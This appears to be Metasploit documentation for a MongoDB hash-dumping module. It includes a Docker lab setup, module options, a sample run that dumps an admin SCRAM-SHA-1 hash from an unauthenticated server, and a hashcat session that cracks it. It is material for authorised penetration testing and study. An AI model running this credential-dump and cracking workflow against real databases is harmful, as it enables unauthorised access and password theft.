## Vulnerable Application

This module extracts password hashes from a MongoDB instance and stores
them in the database for later cracking. By default, it dumps system user
credentials from the 'system.users' collection. Alternatively,
it can dump application user hashes from a specified collection.

Use Hashcat mode 24100 for SCRAM-SHA-1 and 24200 for SCRAM-SHA-256
Successfully tested against MongoDB 3.6 with and without authentication

### Docker Compose Setup

#### init-mongo.js

Write this file to `init-mongo.js`

```
// Switch to 'intranet' database
db = db.getSiblingDB('intranet');

// Create a non-root read/write user for testing
db.createUser({
  user: "testuser",
  pwd: "testpass",
  roles: [
    { role: "readWrite", db: "intranet" }
  ]
});

// Create sample collection and documents
db.users.insertMany([
  { user: "admin", role: "administrator", email: "admin@corp.local" },
  { user: "jdoe", role: "developer", email: "jdoe@corp.local" }
]);

db.config.insertMany([
  { key: "site_name", value: "Internal Portal", note: "Production config" }
]);
```

#### docker-compose.yml with OUT authentication

```
version: '3.8'

services:
  mongodb:
    image: mongo:3.6
    container_name: mongodb_auth_test
    ports:
      - "27017:27017"
    environment:
      MONGO_INITDB_DATABASE: intranet
    volumes:
      - mongo_data:/data/db
      - ./init-mongo.js:/docker-entrypoint-initdb.d/init-mongo.js:ro

volumes:
  mongo_data:
```

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/scanner/mongodb/mongodb_hashdump`
1. Optionally Do: `set username <username>`
1. Optionally Do: `set password <password>`
1. Do: `set rhost [ip]`
1. Do: `run`
1. You should get a hash dump

## Options

### DB

Database to query. Defaults to `admin`

### COLLECTION

Custom collection to dump (if empty, dumps system.users). Defaults to ``.

### USER_FIELD

Username field name for custom collection. Defaults to `username`

### HASH_FIELD

Hash field name for custom collection. Defaults to `hash`

### USERNAME

Username for authentication if required. Defaults to ``.

### PASSWORD

Password for authentication if required. Defaults to ``.

## Scenarios

### MongoDB 3.6

```
msf > use auxiliary/scanner/mongodb/mongodb_hashdump 
msf auxiliary(scanner/mongodb/mongodb_hashdump) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf auxiliary(scanner/mongodb/mongodb_hashdump) > exploit
[*] 127.0.0.1:27017 - Connecting to 127.0.0.1...
[+] 127.0.0.1:27017 - No authentication required
[*] 127.0.0.1:27017 - Dumping MongoDB system users from admin.system.users...
[+] 127.0.0.1:27017 - 
MongoDB System Hashes
=====================

Type              Username  Hash
----              --------  ----
db (SCRAM-SHA-1)  admin     $mongodb-scram$*0*YWRtaW4=*10000*1kvLnsfbYpJe0HcO/W7MLw==*NyPJ9yTYQcSRYcyC+8rCqvu9c4g=

[*] 127.0.0.1:27017 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Cracking

```
$ hashcat /tmp/hashes.txt -m 24100 -a 0 /tmp/wordlist --potfile-disable
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-ivybridge-Intel(R) Xeon(R) CPU E5-2650 v2 @ 2.60GHz, 39240/78480 MB (16384 MB allocatable), 12MCU

...clip...

Approaching final keyspace - workload adjusted.           

$mongodb-scram$*0*YWRtaW4=*10000*1kvLnsfbYpJe0HcO/W7MLw==*NyPJ9yTYQcSRYcyC+8rCqvu9c4g=:adminpassword
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 24100 (MongoDB ServerKey SCRAM-SHA-1)
Hash.Target......: $mongodb-scram$*0*YWRtaW4=*10000*1kvLnsfbYpJe0HcO/W...u9c4g=
Time.Started.....: Fri Aug 14 14:31:45 2026 (0 secs)
Time.Estimated...: Fri Aug 14 14:31:45 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/tmp/wordlist)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:      225 H/s (0.86ms) @ Accel:87 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3/3 (100.00%)
Rejected.........: 0/3 (0.00%)
Restore.Point....: 0/3 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:9000-9999
Candidate.Engine.: Device Generator
Candidates.#01...: admin -> password
Hardware.Mon.#01.: Util: 20%

Started: Fri Aug 14 14:31:42 2026
Stopped: Fri Aug 14 14:31:47 2026
```
